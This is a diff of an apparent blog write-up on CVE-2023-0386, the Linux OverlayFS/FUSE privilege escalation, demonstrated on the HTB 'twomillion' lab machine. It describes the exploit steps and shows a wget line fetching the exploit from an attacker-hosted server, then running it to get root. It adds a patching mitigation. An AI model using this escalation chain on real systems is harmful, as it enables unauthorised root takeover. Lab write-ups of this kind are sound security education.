@@ -67,14 +67,9 @@ Now lets look at the CVE itself. CVE-2023-0386 is a privilege escalation vulnera
 - CVE-2023-0386 occurs because the Linux kernel did not properly validate the UID/GID mapping of a file's owner during an OverlayFS copy-up operation. An attacker can create a file inside an unprivileged user namespace where they appear to be as a root user(UID=0.GID=0) within that namespace and set the SUID bit on the file. When OverlayFS(the overlayFS driver which is part of the kernel) performs a copy-up, the kernel blindly trusts the file's ownership information from the namespace without verifying that the file owner's UID/GID has a valid mapping to the host user namespace. As a result, the kernel copies the file into the upper layer while preserving its privileged metadata(In this case the root ownership and the set SUID bit).
 
 - After the copy-up is completed, the attacker exits the user namespace and executes the copied file from the upper layer. Because the file now exists on the host filesystem as a root-owned SUID executable, executing it causes the program to run with host root privileges, resulting in a local privilege escalation.
+- A local user permitted to mount overlay mounts in user namespaces can take advantage of this flaw for local privilege
+    escalation.
 - Affected linux kernel versions are from ```5.11 to 6.1.8(Including)```
-
-### How the exploit works?
-- For the exploit to work, first we need to SUID binary in the lower layer.
-- Normally a low privileged user cannot create file which is owned by root or even set SUID bit of file owned by root in the host system. But you probably might be thinking we can use the user namespace for this right? Like I previously explained anyone inside user namespace could be root right?
-- Well here's where things get a little tricky. Kernel does allows any file within the namespace to be owned by root or even SUID but can be set, because user within namespace has the CAP_FOWNER capabilities but within the host system, the same file cannot have host root ownership.
-- The reason for that is a normal user namespace uses the host machine's filesystem like ext4, which doesn't let unprivileged user create a file that appears to be owned by the host root.
-- To bypass that, we'll be using something like FUSE(Filesystem in Userspace)
 
 ### FUSE (Filesystem in Userspace)
 - FUSE is a software interface for unix-like operating systems that allows unprivileged users to create/mount custom filesystems without making any edits to the kernel.
@@ -82,8 +77,24 @@ Now lets look at the CVE itself. CVE-2023-0386 is a privilege escalation vulnera
 - Now coming to how FUSE actually helps with this vulnerability, Any file created inside a FUSE filesystem inherits whatever permissions the user-space handler gives it. Since the kernel isn't running the underlying filesystem code, it blindly trusts what the FUSE daemon reports—which is exactly how this boundary gets exploited.
 - Now, if we create a root owned binary with SUID bit set and tell the kernel that this binary is host root owned with SUID bit set, then kernel will simply believe it and when user triggers the copy-up of this binary, kernel will directly copy this file to the upper directory of which we have configured foe overlayFS whbich is in the host system.
 
+<!-- ### How the exploit works? - REMOVE
+- For the exploit to work, first we need to SUID binary in the lower layer.
+- Normally a low privileged user cannot create file which is owned by root or even set SUID bit of file owned by root in the host system. But you probably might be thinking we can use the user namespace for this right? Like I previously explained anyone inside user namespace could be root right?
+- Well here's where things get a little tricky. Kernel does allows any file within the namespace to be owned by root or even SUID but can be set, because user within namespace has the CAP_FOWNER capabilities but within the host system, the same file cannot have host root ownership.
+- The reason for that is a normal user namespace uses the host machine's filesystem like ext4, which doesn't let unprivileged user create a file that appears to be owned by the host root.
+- To bypass that, we'll be using something like FUSE(Filesystem in Userspace) -->
 
-### Exploiting CVE-2023-0386
+### How the exploit works? - NEW
+- First we need to be able to create a root owned file and change the file's SUID bit, for that we'll need to create a user namespace.
+- Now we need a custom filesystem that'll tell the kernel that the file is actually owned by root. For this we'll be using a FUSE program(written in C code)amd we'll provide a target directrory(within the user namespace) as an argument to the program.
+- FUSE program will interact with kernel and mount this directory
+- Now we'll be creating an overlayFS with lower layer as the FUSE mount and upper directory as a world writable host directory(something like /tmp).
+- Now we'll create a binary(mostly a bash shell) and trigger a copy-up operation by simply using the touch command on the binary.
+- Due to the underlying flaw in the overlayFS subsystem, it'll copy the binary to the /tmp directory while keeping the UID=0 and SUID bit.
+
+
+
+### Exploitation in Action
 > Spoiler Alert!!. I'll be using the HTB machine called twomillion to demonstrate this vulnerability. Assume that we have initial access to the target machine(I'm skipping the initial access part for the sake of this blog)
 {: .prompt-info }
 
@@ -111,11 +122,13 @@ $ uname -r
     ```bash
     python3 -m http.server
     ```
+    ![http_listener](/assets/img/http_listener.png)
 
     *Victim's machine*
     ```bash
     wget http://<ATTACKER-MACHINE-IP>:8000/exploit
     ```
+    ![fetch_exploit](/assets/img/exploit_received.png)
 
 - Now change the execute permission of the file and execute it
     ```bash
@@ -126,7 +139,12 @@ $ uname -r
     ./exploit
     ```
 
-- If we check the current user, we can see we are root now.
+- If we check the current user, we can see we are root now. We have successfully escalated our privileges from a normal user to root.
+![priv_esc](/assets/img/priv_esc.png)
+
+## Mitigating CVE-2023-0386
+- Immediate mitigation step would be to apply vendor specific kernel updates. You can refer the debian's security patch tracker: [Debian security path tracker](https://security-tracker.debian.org/tracker/CVE-2023-0386)
+- 
 
 
     
